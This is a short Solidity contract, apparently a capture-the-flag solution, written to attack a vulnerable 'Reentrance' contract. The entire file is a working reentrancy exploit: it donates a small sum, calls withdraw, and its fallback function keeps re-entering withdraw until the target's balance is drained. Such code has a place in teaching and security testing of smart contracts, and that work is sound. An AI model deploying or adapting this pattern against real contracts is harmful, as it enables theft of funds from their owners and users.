// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceHack {

    Reentrance public targetContract;

    constructor(address payable _targetContract) payable{
        targetContract = Reentrance(_targetContract);
    }

    function Attack() public{
        targetContract.donate{value: 0.001 ether}(address(this));
        targetContract.withdraw(0.001 ether);
    }

    fallback() payable external{
        if(address(targetContract).balance >= 0.001 ether){
            targetContract.withdraw(0.001 ether);
        }
    }
}